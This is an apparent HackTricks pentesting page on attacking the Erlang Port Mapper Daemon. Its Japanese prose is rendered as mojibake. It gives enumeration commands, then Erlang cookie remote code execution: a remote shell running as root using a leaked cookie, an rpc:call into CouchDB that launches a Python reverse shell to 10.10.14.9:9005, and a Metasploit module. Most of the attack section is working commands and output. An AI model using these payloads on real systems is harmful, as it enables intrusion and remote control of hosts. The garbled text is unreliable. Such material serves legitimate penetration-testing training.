```markdown
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ã‚’ä½¿ç”¨ã—ã¦ã€AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã³ã¾ã—ã‚‡ã†</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«åºƒå‘Šã‚’æ²è¼‰ã—ãŸã„å ´åˆ**ã‚„**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„å ´åˆ**ã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹ã‹**ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„**ã€‚
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>


# åŸºæœ¬æƒ…å ±

Erlangãƒãƒ¼ãƒˆãƒãƒƒãƒ‘ãƒ¼ãƒ‡ãƒ¼ãƒ¢ãƒ³ã¯ã€åˆ†æ•£Erlangã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’èª¿æ•´ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚å½¼ã®ä»•äº‹ã¯ã€**ã©ã®ãƒãƒ¼ãƒ‰åãŒã©ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã§ãƒªãƒƒã‚¹ãƒ³ã—ã¦ã„ã‚‹ã‹ã‚’è¿½è·¡ã™ã‚‹ã“ã¨**ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€epmdã¯ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒãƒ¼ãƒ‰åã‚’ãƒã‚·ãƒ³ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ãƒãƒƒãƒ”ãƒ³ã‚°ã—ã¾ã™ã€‚

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆ**: 4369
```
```
PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
```
ã“ã®æŠ€è¡“ã¯ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§RabbitMQã¨CouchDBã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

# åˆ—æŒ™

## æ‰‹å‹•
```bash
echo -n -e "\x00\x01\x6e" | nc -vn <IP> 4369

#Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
apt-get install erlang
erl #Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). #This will return the listen addresses
```
## è‡ªå‹•
```bash
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info <IP>

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|     bigcouch: 11502
|     freeswitch: 8031
|     ecallmgr: 11501
|     kazoo_apps: 11500
|_    kazoo-rabbitmq: 25672
```
# Erlang Cookie RCE

## ãƒªãƒ¢ãƒ¼ãƒˆæ¥ç¶š

èªè¨¼ã‚¯ãƒƒã‚­ãƒ¼ã‚’**æ¼æ´©**ã§ãã‚Œã°ã€ãƒ›ã‚¹ãƒˆä¸Šã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚é€šå¸¸ã€ã“ã®ã‚¯ãƒƒã‚­ãƒ¼ã¯ `~/.erlang.cookie` ã«ã‚ã‚Šã€erlangã«ã‚ˆã£ã¦æœ€åˆã®èµ·å‹•æ™‚ã«ç”Ÿæˆã•ã‚Œã¾ã™ã€‚æ‰‹å‹•ã§å¤‰æ›´ã¾ãŸã¯è¨­å®šã•ã‚Œã¦ã„ãªã„å ´åˆã€ãƒ©ãƒ³ãƒ€ãƒ ãªæ–‡å­—åˆ— \[A:Z] ã§ã€é•·ã•ã¯20æ–‡å­—ã§ã™ã€‚
```bash
greif@baldr ~$ erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
Erlang/OTP 19 [erts-8.1] [source] [64-bit] [async-threads:10]

Eshell V8.1 (abort with ^G)

At last, we can start an erlang shell on the remote system.

(test@target.fqdn)1>os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```
è©³ç´°ã«ã¤ã„ã¦ã¯ã€[https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚
è‘—è€…ã¯ã‚¯ãƒƒã‚­ãƒ¼ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã‚‚å…±æœ‰ã—ã¦ã„ã¾ã™ï¼š

{% file src="../.gitbook/assets/epmd_bf-0.1.tar.bz2" %}

## ãƒ­ãƒ¼ã‚«ãƒ«æ¥ç¶š

ã“ã®ã‚±ãƒ¼ã‚¹ã§ã¯ã€CouchDBã‚’æ‚ªç”¨ã—ã¦ãƒ­ãƒ¼ã‚«ãƒ«ã§æ¨©é™æ˜‡æ ¼ã‚’å›³ã‚Šã¾ã™ï¼š
```bash
HOME=/ erl -sname anonymous -setcookie YOURLEAKEDCOOKIE
(anonymous@canape)1> rpc:call('couchdb@localhost', os, cmd, [whoami]).
"homer\n"
(anonymous@canape)4> rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\", 9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
```
ä¾‹ã¯[https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)ã‹ã‚‰å–ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚
ã“ã®è„†å¼±æ€§ã‚’ã©ã®ã‚ˆã†ã«**exploitã™ã‚‹ã‹**ã€**Canape HTBãƒã‚·ãƒ³ã‚’ä½¿ç”¨ã—ã¦** **ç·´ç¿’**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## Metasploit
```bash
#Metasploit can also exploit this if you know the cookie
msf5> use exploit/multi/misc/erlang_cookie_rce
```
# Shodan

* `port:4369 "at port"`

<details>

<summary><strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶ã«ã¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„å ´åˆ**ã‚„**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„å ´åˆ**ã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„ã€‚
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ã€‚
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹ã‹**ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã«**ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’**å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
